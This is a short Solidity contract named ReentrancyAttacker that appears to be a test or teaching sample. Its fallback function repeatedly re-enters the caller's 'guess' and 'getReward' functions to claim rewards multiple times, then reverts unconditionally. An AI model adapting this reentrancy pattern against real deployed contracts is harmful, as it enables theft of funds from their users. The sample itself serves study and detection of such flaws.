pragma solidity ^0.4.2;

contract ReentrancyAttacker {
    uint256 counter = 0;

    function() external payable {
        counter++;
        if (counter <= 5) {
            require(msg.sender.call(bytes4(keccak256("guess(uint256)")), 1));
            require(msg.sender.call(bytes4(keccak256("getReward()"))));
            msg.sender.call(bytes4(keccak256("")));
        }
        revert();
    }
}
